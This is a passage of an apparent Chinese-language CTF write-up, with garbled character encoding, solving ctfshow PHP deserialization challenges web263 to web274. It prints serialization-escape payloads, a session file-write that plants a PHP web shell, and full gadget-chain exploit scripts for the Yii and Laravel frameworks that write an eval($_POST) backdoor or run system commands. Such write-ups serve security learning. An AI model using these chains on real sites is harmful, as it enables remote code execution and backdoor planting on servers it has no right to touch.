&#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    setcookie(&#x27;msg&#x27;,base64_encode($umsg));</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ›¿æ¢å‰åé•¿åº¦ä¸ä¸€è‡´å¯¼è‡´äº†é€ƒé€¸ï¼Œ<a href="https://zhuanlan.zhihu.com/p/330670521">ç»†è¯´phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ - çŸ¥ä¹ (zhihu.com)</a></p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ fuckè®²tokençš„å€¼ç”±useræ”¹ä¸ºadminå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$us=new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:4:&quot;aaaa&quot;;s:2:&quot;to&quot;;s:4:&quot;aaaa&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&#x27;,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;);</span><br></pre></td></tr></table></figure><p>é æŠŠfuckå˜æˆloveUæ¯æ¬¡å¤šä¸€ä¸ªå­—ç¬¦æŠŠåé¢çš„å­—ç¬¦å…¨éƒ¨ç»™æè¿›æ¥</p><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>å­˜åœ¨æ–‡ä»¶æ³„éœ²/<a href="http://www.zip/">www.zip</a></p><p>è¯»index.phpæ²¡æœ‰è¯»åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œç»§ç»­çœ‹check.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„file_put_contentså¯ä»¥åˆ©ç”¨ï¼Œæ­¤å¤„å­˜åœ¨usernameå’Œpasswordå¯æ§ï¼Œæˆ‘ä»¬ä»æ­¤å¤„å†™å…¥æ–‡ä»¶ï¼Œä¼ é©¬ğŸå¼€æï¼</p><p>æ„é€ ååºåˆ—åŒ–ï¼Œåˆ©ç”¨ä»–çš„è¿™ä¸ªé…ç½®é—®é¢˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:25:&quot;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>base64ç¼–ç ä¸‹ï¼Œè®¿é—®log-1.php</p><p>getshell</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># @message.php</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));</span><br><span class="line">    $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg);</span><br><span class="line">    echo &#x27;Your message has been sent&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>æœ‰ç‚¹æ•…æŠ€é‡æ–½çš„æ„æ€ï¼Œåˆæ˜¯å› ä¸ºæ›¿æ¢çš„å­—ç¬¦å’ŒåŸæ¥é•¿åº¦ä¸ä¸€è‡´ï¼Œå¯¼è‡´æˆ‘å¯ä»¥ä»»æ„å†™å…¥å†…å®¹äº†ï¼Œçˆ±ä½äº†ã€‚</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=1&amp;m=flag&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token=$t;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);</span><br><span class="line">$ctfshow-&gt;token=md5(mt_rand());</span><br><span class="line"></span><br><span class="line">if($ctfshow-&gt;login())&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æœ‰ç‚¹ä¸å¥½æå› ä¸ºå¤ªéšæœºäº†</p><p>ä½†è¿™æ¬¡ç”¨äº†ä¸€æ‹›ï¼Œç±»ä¼¼c++é‡Œé¢çš„å¼•ç”¨ï¼Œå°±æ˜¯è®²passwordææˆtokençš„åˆ«åï¼Œè®©ä»–çš„å€¼éšç€tokenå˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowAdmin&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($t,$p)&#123;</span><br><span class="line">        $this-&gt;token= &amp;$this-&gt;password;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;token=&amp;$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;i:1234;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"><a href="#web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ" class="headerlink" title="web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ"></a>web266â€“PHPå¯¹ç±»åçš„å¤§å°å†™ä¸æ•æ„Ÿ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$cs = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login()&#123;</span><br><span class="line">        return $this-&gt;username===$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ctfshowo=@unserialize($cs);</span><br><span class="line">if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;</span><br><span class="line">    throw new Exception(&quot;Error $ctfshowo&quot;,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ä¸€ä¸‹ï¼ŒæŠŠç±»åå¤§å†™å³å¯ï¼Œé‡Œé¢ä¸ç”¨æœ‰ä¸œè¥¿ï¼Œèƒ½è§¦å‘__destructå°±è¡Œ</p><h2 id="web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web267ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>å¼±å£ä»¤admin admin</p><p>ç™»é™†åçœ‹å‰ç«¯æºç å‘ç°aboutå‡ºå­˜åœ¨æºç </p><p><img src="https://img-blog.csdnimg.cn/cee2e0df9448485990e5ee0c6a6158b4.png" alt="img"></p><p>ä»ç¾¤é‡Œæ‹¿äº†è¿™ä¸ªæ¡†æ¶çš„é“¾å­ç›´æ¥æ¥ç”¨çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line">        //echo &quot;&lt;?php eval($_POST[1]);? &gt;&quot; &gt; /var/www/html/basic/web/1.php</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;formatters[&#x27;close&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace yii\db&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line"></span><br><span class="line">    class BatchQueryResult&#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;_dataReader = new Generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    echo base64_encode(serialize(new yii\db\BatchQueryResult));</span><br><span class="line">   // print_r(&#x27;aaaa&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°2.phpå¯ä»¥æˆåŠŸrceäº†ã€‚</p><h2 id="web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web268ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>åŒæ ·æ˜¯yiiä¸Šé¢çš„é‚£æ¡é“¾å­ä¸èƒ½ç”¨äº†ï¼Œç”¨äº†ä¸‹é¢è¿™æ¡ï¼Œæ“ä½œåŸºæœ¬ä¸€è‡´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest&#123;</span><br><span class="line">    class CreateAction&#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">        public $id;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="line">            $this-&gt;id = &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    use yii\rest\CreateAction;</span><br><span class="line"></span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span><br><span class="line">            $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// poc2</span><br><span class="line">namespace Codeception\Extension&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class RunProcess&#123;</span><br><span class="line">        private $processes;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;processes = [new Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    // ç”Ÿæˆpoc</span><br><span class="line">    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web269ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>ä¸Šè¿°é‚£ä¸ªé“¾å­ä¹Ÿä¸è¡Œäº†ï¼Œä»ç½‘ä¸Šæ‰¾äº†ä¸€æ¡æ–°é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">namespace yii\rest &#123;</span><br><span class="line">    class Action</span><br><span class="line">    &#123;</span><br><span class="line">        public $checkAccess;</span><br><span class="line">    &#125;</span><br><span class="line">    class IndexAction</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;checkAccess = $func;</span><br><span class="line">            $this-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\web &#123;</span><br><span class="line">    abstract class MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public $writeCallback;</span><br><span class="line">    &#125;</span><br><span class="line">    class DbSession extends MultiFieldSession</span><br><span class="line">    &#123;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace yii\db &#123;</span><br><span class="line">    use yii\base\BaseObject;</span><br><span class="line">    class BatchQueryResult</span><br><span class="line">    &#123;</span><br><span class="line">        private $_dataReader;</span><br><span class="line">        public function __construct($func, $param)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;shell_exec&#x27;, &quot;echo &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;);</span><br><span class="line">    echo(base64_encode(serialize($exp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web270ï¼ˆyiiååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>ç›´æ¥ç”¨269çš„é“¾å­è¿˜å¯ä»¥ã€‚</p><h2 id="web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰"><a href="#web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰" class="headerlink" title="web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰"></a>web271ï¼ˆlavaralååºåˆ—åŒ–æ¼æ´ï¼‰</h2><p>æ‰¾äº†è¿™ä¸ªé“¾å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = new \Illuminate\Bus\Dispatcher();</span><br><span class="line">            $this-&gt;event = new BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  class BroadcastEvent &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus &#123;</span><br><span class="line">    class Dispatcher &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Mockery\Loader &#123;</span><br><span class="line">    class EvalLoader &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator &#123;</span><br><span class="line">    class MockDefinition &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        function __construct($evilCode)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;code = $evilCode;</span><br><span class="line">            $this-&gt;config = new MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class MockConfiguration &#123;</span><br><span class="line">        protected $name = &#x27;abcdefg&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  $code = &quot;&lt;?php system(&#x27;cat /flag&#x27;); exit; ?&gt;&quot;;;</span><br><span class="line">  $exp = new \Illuminate\Broadcasting\PendingBroadcast($code);</span><br><span class="line">  echo urlencode(serialize($exp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>åŒä¸Š</p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>åŒä¸Š</p><h2 id="web274ï¼ˆthinkphpï¼‰"><a href="#web274ï¼ˆthinkphpï¼‰" class="headerlink" title="web274ï¼ˆthinkphpï¼‰"></a>web274ï¼ˆthinkphpï¼‰</h2><p>thinkphpç°åœ¨æ¯”èµ›å¥½å°‘è§çš„èº«å½±ï¼Œå»å¹´æˆ‘æ˜¯èŒæ–°æ—¶å¤©å¤©è§ã€‚</p><p>æ‰¾ä¸€æ¡é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">namespace think;</span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = 